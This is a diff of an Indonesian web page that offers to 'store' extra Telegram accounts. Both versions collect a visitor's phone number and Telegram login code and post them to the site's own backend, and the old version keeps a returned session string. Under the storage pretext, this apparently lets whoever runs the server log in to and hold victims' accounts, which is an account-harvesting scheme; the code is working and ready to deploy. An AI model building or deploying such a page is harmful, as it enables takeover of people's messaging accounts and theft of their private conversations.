@@ -1,119 +1,89 @@
 <!DOCTYPE html>
-<html lang="id">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Penyimpanan Akun Telegram - GusOfcXD 404</title>
-    <!-- CSS sama seperti sebelumnya, saya singkat saja -->
-    <style>body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;background-color:#121212;color:#e0e0e0;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;padding:20px;box-sizing:border-box}.container{background-color:#1e1e1e;padding:30px;border-radius:12px;box-shadow:0 4px 20px rgba(0,0,0,.5);width:100%;max-width:600px}h1{text-align:center;color:#00aaff;margin-bottom:10px}.penjelasan{background-color:#2a2a2a;padding:15px;border-radius:8px;border-left:4px solid #ffaa00;margin-bottom:25px;font-size:14px;line-height:1.6}.form-group{margin-bottom:20px}label{display:block;margin-bottom:8px;font-weight:bold}.input-with-button{display:flex;gap:10px}.input-with-button input[type=text]{flex-grow:1}input[type=text],input[type=number]{width:100%;padding:12px;background-color:#2a2a2a;border:1px solid #444;border-radius:6px;color:#fff;font-size:16px;box-sizing:border-box}input[type=text]:focus,input[type=number]:focus{outline:none;border-color:#00aaff;box-shadow:0 0 5px rgba(0,170,255,.5)}.btn-primary{width:100%;padding:12px;background-color:#00aaff;color:#fff;border:none;border-radius:6px;font-size:16px;font-weight:bold;cursor:pointer;transition:background-color .3s ease}.btn-primary:hover{background-color:#0088cc}.btn-secondary{padding:12px 20px;background-color:#444;color:#fff;border:none;border-radius:6px;font-size:14px;font-weight:bold;cursor:pointer;transition:background-color .3s ease;white-space:nowrap}.btn-secondary:hover{background-color:#555}.btn-secondary:disabled,.btn-primary:disabled{background-color:#333;cursor:not-allowed;opacity:.6}.account-list{margin-top:30px}.account-list h2{color:#00aaff;border-bottom:2px solid #333;padding-bottom:10px;margin-bottom:15px}table{width:100%;border-collapse:collapse}th,td{padding:12px;text-align:left;border-bottom:1px solid #333}th{background-color:#2a2a2a;font-weight:bold}.status{text-align:center;padding:10px;margin-top:15px;border-radius:6px;font-weight:bold}.status.success{background-color:#2d5a2d;color:#aaffaa}.status.error{background-color:#5a2d2d;color:#ffaaaa}.status.info{background-color:#2a4a5a;color:#aaccff}</style>
+  <meta charset="UTF-8">
+  <title>Penyimpanan Akun Telegram</title>
+  <style>
+    body { font-family: Arial; background:#f2f2f2; padding:20px; }
+    .box { background:white; padding:20px; border-radius:10px; max-width:600px; margin:auto; }
+    input { width:100%; padding:10px; margin:10px 0; border-radius:6px; border:1px solid #ccc; }
+    button { padding:10px 15px; border:none; border-radius:6px; cursor:pointer; }
+    .send { background:#1976D2; color:white; }
+    .save { background:#00bfa6; color:white; }
+    .logout { background:#d32f2f; color:white; margin-top:10px; }
+    .item { background:#fff; padding:10px; margin:10px 0; border-radius:8px; border:1px solid #eee; }
+  </style>
 </head>
 <body>
-    <div class="container">
-        <h1>🤖 Penyimpanan Akun Telegram</h1>
-        <p style="text-align:center; opacity:0.7;">Device: GusOfcXD 404</p>
-        <div class="penjelasan"><strong>JADI GINI BREK,</strong> INI TU BISA BANTU LU NYIMPAN AKUN TELEGRAM LU, POKOKNYA KAYAK TELEGRAM KITA DAH FULL, TAPI MAU NAMBAH LAGI, TAPI GAK PREMIUM, JADI KE SINI AJA.</div>
-        <form id="loginForm">
-            <div class="form-group">
-                <label for="nomorTelegram">Masukan Nomor Telegram Anda</label>
-                <div class="input-with-button">
-                    <input type="text" id="nomorTelegram" placeholder="contoh: 628123456789" required>
-                    <button type="button" id="sendCodeBtn" class="btn-secondary">Kirim Code</button>
-                </div>
-            </div>
-            <div class="form-group">
-                <label for="codeTelegram">Masukan Kode Yang Udah Dikirimkan</label>
-                <input type="text" id="codeTelegram" placeholder="kode 5 digit" required disabled>
-            </div>
-            <button type="submit" id="saveAccountBtn" class="btn-primary" disabled>Simpan Akun</button>
-        </form>
-        <div id="statusMessage"></div>
-        <div class="account-list">
-            <h2>Daftar Akun Tersimpan (<span id="accountCount">0</span>/100)</h2>
-            <table>
-                <thead><tr><th>No.</th><th>Nomor</th><th>Status</th></tr></thead>
-                <tbody id="accountTableBody"></tbody>
-            </table>
-        </div>
-    </div>
 
-    <script>
-        document.addEventListener('DOMContentLoaded', () => {
-            const loginForm = document.getElementById('loginForm');
-            const nomorInput = document.getElementById('nomorTelegram');
-            const codeInput = document.getElementById('codeTelegram');
-            const sendCodeBtn = document.getElementById('sendCodeBtn');
-            const saveAccountBtn = document.getElementById('saveAccountBtn');
-            const tableBody = document.getElementById('accountTableBody');
-            const statusDiv = document.getElementById('statusMessage');
-            const accountCountSpan = document.getElementById('accountCount');
+<div class="box">
+  <h2>Penyimpanan Akun Telegram</h2>
 
-            let accountCounter = 0;
+  <label>Masukan nomor telegram anda</label>
+  <input id="nomor" type="text" placeholder="+62XXXX">
 
-            sendCodeBtn.addEventListener('click', async () => {
-                const nomor = nomorInput.value;
-                if (!nomor) return showStatus('Nomor harus diisi!', 'error');
-                
-                sendCodeBtn.disabled = true; sendCodeBtn.textContent = 'Mengirim...';
-                try {
-                    const res = await fetch('/send-code', { // URL relatif ke backend
-                        method: 'POST', headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ nomor })
-                    });
-                    const result = await res.json();
-                    if (result.success) {
-                        showStatus(result.message, 'info');
-                        codeInput.disabled = false; saveAccountBtn.disabled = false; codeInput.focus();
-                    } else {
-                        showStatus(result.message, 'error');
-                    }
-                } catch (error) {
-                    showStatus('Gagal terhubung ke server.', 'error');
-                } finally {
-                    sendCodeBtn.disabled = false; sendCodeBtn.textContent = 'Kirim Code';
-                }
-            });
+  <label>Masukan code yang udh di kirimkan</label>
+  <input id="kode" type="text" placeholder="Kode OTP">
 
-            loginForm.addEventListener('submit', async (e) => {
-                e.preventDefault();
-                const nomor = nomorInput.value;
-                const code = codeInput.value;
-                saveAccountBtn.disabled = true; saveAccountBtn.textContent = 'Menyimpan...';
-                
-                try {
-                    const res = await fetch('/login-and-save', { // URL relatif ke backend
-                        method: 'POST', headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ nomor, code })
-                    });
-                    const result = await res.json();
-                    if (result.success) {
-                        showStatus(result.message, 'success');
-                        // Simpan session yang lengkap ke localStorage (penyimpanan browser)
-                        if(result.session) {
-                            localStorage.setItem(`tg_session_${nomor}`, result.session);
-                        }
-                        addAccountToTable(nomor, 'Tersimpan ✅');
-                        resetForm();
-                    } else {
-                        showStatus(result.message, 'error');
-                    }
-                } catch (error) {
-                    showStatus('Gagal terhubung ke server.', 'error');
-                } finally {
-                    saveAccountBtn.disabled = false; saveAccountBtn.textContent = 'Simpan Akun';
-                }
-            });
+  <button class="send" onclick="kirim()">Kirim code</button>
+  <button class="save" onclick="verif()">Verifikasi & Simpan</button>
 
-            function addAccountToTable(nomor, status) {
-                accountCounter++;
-                const newRow = tableBody.insertRow();
-                newRow.insertCell(0).textContent = accountCounter + '.';
-                newRow.insertCell(1).textContent = nomor;
-                newRow.insertCell(2).textContent = status;
-                accountCountSpan.textContent = accountCounter;
-            }
-            function resetForm() { nomorInput.value = ''; codeInput.value = ''; codeInput.disabled = true; saveAccountBtn.disabled = true; }
-            function showStatus(message, type) { statusDiv.innerHTML = message; statusDiv.className = 'status ' + type; setTimeout(() => { statusDiv.innerHTML = ''; statusDiv.className = ''; }, 6000); }
-        });
-    </script>
+  <h3>Daftar akun (max 100)</h3>
+  <div id="list"></div>
+
+</div>
+
+<script>
+let akun = JSON.parse(localStorage.getItem("akunTG") || "[]");
+
+function render() {
+  let html = "";
+  akun.forEach(a => {
+    html += `
+      <div class="item">
+        <b>Nomor:</b> ${a.nomor}<br>
+        <b>Status:</b> Login tersimpan
+      </div>
+    `;
+  });
+  document.getElementById("list").innerHTML = html;
+}
+
+async function kirim() {
+  const nomor = document.getElementById("nomor").value.trim();
+  if (!nomor) return alert("Masukkan nomor!");
+
+  const res = await fetch("/kirimOTP?nomor=" + nomor);
+  const data = await res.json();
+
+  alert(data.msg);
+}
+
+async function verif() {
+  const nomor = document.getElementById("nomor").value.trim();
+  const kode = document.getElementById("kode").value.trim();
+
+  if (!nomor || !kode) return alert("Isi nomor & kode!");
+
+  const res = await fetch("/verifikasi", {
+    method: "POST",
+    headers: {"Content-Type": "application/json"},
+    body: JSON.stringify({ nomor, kode })
+  });
+
+  const data = await res.json();
+
+  if (!data.ok) return alert(data.msg);
+
+  akun.push({ nomor });
+  localStorage.setItem("akunTG", JSON.stringify(akun));
+
+  render();
+  alert("Akun berhasil disimpan!");
+}
+
+render();
+</script>
+
 </body>
 </html>
